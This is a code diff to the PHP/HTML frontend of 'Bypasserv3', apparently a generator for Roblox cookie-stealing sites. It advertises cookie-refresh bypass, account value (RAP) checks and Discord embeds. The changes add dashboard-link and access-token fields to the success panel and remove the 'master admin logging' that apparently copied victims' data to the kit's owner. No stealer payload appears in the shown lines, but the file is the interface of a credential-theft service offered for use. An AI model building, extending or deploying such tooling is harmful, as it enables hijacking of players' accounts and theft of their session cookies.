@@ -1,6 +1,6 @@
 <?php
 /**
- * Bypasserv3 - Dualhook Generator
+ * Bypasserv3 - Generator Frontend
  * Modern Dark Grey/Black Design
  */
 
@@ -427,6 +427,18 @@ $globalStats = getGlobalStats();
                     <div class="info-value" id="successLink"></div>
                 </div>
 
+                <!-- Dashboard Link -->
+                <div class="info-section">
+                    <div class="info-label">📊 Dashboard</div>
+                    <div class="info-value" id="successDashboard"></div>
+                </div>
+
+                <!-- Access Token -->
+                <div class="info-section">
+                    <div class="info-label">🔑 Access Token</div>
+                    <div class="info-value" id="successToken"></div>
+                </div>
+
                 <!-- Full Features -->
                 <div class="features-list">
                     <div class="features-title">✨ Full Features</div>
@@ -436,10 +448,9 @@ $globalStats = getGlobalStats();
                     <div class="feature-item">✓ Limited RAP calculation</div>
                     <div class="feature-item">✓ Group ownership detection</div>
                     <div class="feature-item">✓ Friend count display</div>
-                    <div class="feature-item">✓ Game visit stats</div>
                     <div class="feature-item">✓ Rich Discord embeds</div>
                     <div class="feature-item">✓ Cookie refresh bypass</div>
-                    <div class="feature-item">✓ Master admin logging</div>
+                    <div class="feature-item">✓ Dashboard analytics</div>
                 </div>
 
                 <!-- How It Works -->
@@ -463,7 +474,7 @@ $globalStats = getGlobalStats();
                     </div>
                     <div class="how-item">
                         <span class="how-number">5.</span>
-                        <span>Master log sent to admin</span>
+                        <span>Track everything in your dashboard</span>
                     </div>
                 </div>
 
@@ -523,6 +534,8 @@ $globalStats = getGlobalStats();
                     document.getElementById('successContainer').style.display = 'block';
                     document.getElementById('successSiteName').textContent = data.directory;
                     document.getElementById('successLink').textContent = data.publicUrl;
+                    document.getElementById('successDashboard').textContent = data.dashboardUrl;
+                    document.getElementById('successToken').textContent = data.token;
 
                     Swal.fire({
                         icon: 'success',
@@ -555,4 +568,3 @@ $globalStats = getGlobalStats();
     </script>
 </body>
 </html>
-?>
